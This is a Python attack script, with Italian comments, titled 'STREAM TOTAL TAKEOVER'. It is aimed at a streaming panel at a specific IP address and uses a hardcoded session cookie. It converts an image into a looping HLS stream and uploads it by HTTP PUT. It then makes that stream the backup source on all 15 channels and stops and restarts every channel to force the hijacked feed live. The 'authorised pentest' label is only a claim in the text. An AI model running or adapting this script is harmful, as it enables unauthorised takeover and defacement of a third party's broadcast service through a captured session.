#!/usr/bin/env python3
"""
🔥 STREAM TOTAL TAKEOVER v2.0
pat.png (dir corrente) → f57.m3u8 → UPLOAD → BACKUP ALL → FORCE FALLBACK!
Target: 185.22.183.148:8085 - Autorizzato pentest
"""

import subprocess
import requests
import os
from pathlib import Path

# 🎯 TARGET CONFIG - ESATTO
TARGET = "http://185.22.183.148:8085"
COOKIE = {'PHPSESSID': 'rk9a4s6ub06m8l1fei8jrmop02'}
PNG_FILE = "pat.png"                    # ← Nella dir corrente!
M3U8_NAME = "f57.m3u8"
HLS_BASE_PATH = "media/hls_183_148/f57/" # ← Directory HLS CORRETTA
M3U8_TARGET_URL = f"{TARGET}/{HLS_BASE_PATH}{M3U8_NAME}"

print("🎥 PAT.PNG → WORLD DOMINATION")
print(f"Target: {TARGET}")
print(f"PNG: {os.getcwd()}/{PNG_FILE}")

# 1️⃣ VERIFICA + CONVERT PNG → m3u8 LOOP
def step1_create_m3u8():
    if not os.path.exists(PNG_FILE):
        raise FileNotFoundError(f"❌ pat.png mancante in {os.getcwd()}")
    
    print("🔄 [1/5] pat.png → f57.m3u8 (loop infinito)...")
    
    # Crea directory HLS structure
    Path("f57").mkdir(exist_ok=True)
    
    # FFmpeg: PNG → HLS infinito 25fps
    cmd = [
        'ffmpeg', '-y', '-stream_loop', '-1', '-i', PNG_FILE,
        '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-r', '25',
        '-f', 'hls', '-hls_time', '4', '-hls_list_size', '0',
        '-hls_flags', 'delete_segments+append_list+program_date_time',
        '-master_pl_name', 'master.m3u8',
        f"{HLS_BASE_PATH}{M3U8_NAME}"
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=".")
    if result.returncode != 0:
        print("❌ FFmpeg:", result.stderr)
        raise RuntimeError("Conversione fallita")
    
    print("✅ [1/5] f57.m3u8 creato!")
    return f"{HLS_BASE_PATH}{M3U8_NAME}"

# 2️⃣ UPLOAD COMPLETA STRUCTURE HLS
def step2_upload_m3u8(m3u8_local_path):
    print("🔄 [2/5] UPLOAD f57.m3u8 → target server...")
    
    # Crea directory structure sul target
    requests.put(f"{TARGET}/{HLS_BASE_PATH}", cookies=COOKIE, verify=False)
    
    # UPLOAD m3u8 principale
    with open(M3U8_NAME, 'rb') as f:
        r = requests.put(M3U8_TARGET_URL, cookies=COOKIE, verify=False, data=f)
    
    # UPLOAD segmenti .ts (primi 5 per sicurezza)
    for ts_file in Path(".").glob("f57/*.ts")[:5]:
        with open(ts_file, 'rb') as f:
            requests.put(f"{TARGET}/{ts_file}", cookies=COOKIE, verify=False, data=f)
    
    print(f"✅ [2/5] UPLOAD OK! {M3U8_TARGET_URL} ({r.status_code})")

# 3️⃣ SET BACKUP_SOURCE tutti i 15 canali
def step3_set_backup_all():
    print("🔄 [3/5] BACKUP f57.m3u8 → tutti i 15 canali...")
    
    channels = [str(i) for i in range(1, 16)]
    success = 0
    
    for ch in channels:
        data = {
            ch: 'edit',
            'backup_source': M3U8_TARGET_URL,
            'btn-save': 'Save'
        }
        r = requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
        if r.status_code == 200:
            success += 1
    
    # GLOBAL BACKUP
    data = {'do': 'source_all', 'type': 'backup', 'backup_url': M3U8_TARGET_URL}
    requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
    
    print(f"✅ [3/5] {success}/15 canali backup impostato!")
    return success

# 4️⃣ STOP + START tutti = FORCE BACKUP!
def step4_force_fallback():
    print("🔄 [4/5] STOP → START tutti i canali (FORCE BACKUP!)...")
    
    channels = [str(i) for i in range(1, 16)]
    
    # STOP ALL
    for ch in channels:
        data = {ch: 'stop'}
        requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
    
    time.sleep(2)  # Wait stop
    
    # START ALL → BACKUP ATTIVO!
    for ch in channels:
        data = {ch: 'start'}
        requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
        print(f"🔄 CH{ch} → f57.m3u8 fallback!")
    
    print("✅ [4/5] Fallback attivato!")

# 5️⃣ VERIFICA STATUS
def step5_verify():
    print("🔍 [5/5] Verifica finale...")
    r = requests.get(TARGET, cookies=COOKIE, verify=False)
    if "f57.m3u8" in r.text or "active" in r.text.lower():
        print("🎉 SUCCESS! Stream attive con fallback!")
    else:
        print("⚠️  Verifica manuale: http://185.22.183.148:8085/")
    
    print(f"\n🌍 BACKUP URL: {M3U8_TARGET_URL}")
    print("📺 Controlla: /media/hls_183_148/[id]/playlist.m3u8")

# 🔥 EXECUTE
def main():
    try:
        m3u8_path = step1_create_m3u8()
        step2_upload_m3u8(m3u8_path)
        step3_set_backup_all()
        step4_force_fallback()
        step5_verify()
        print("\n🎪 PAT.PNG DOMINA IL MONDO! 🏆")
    except Exception as e:
        print(f"❌ Errore: {e}")

if __name__ == "__main__":
    import time
    main()
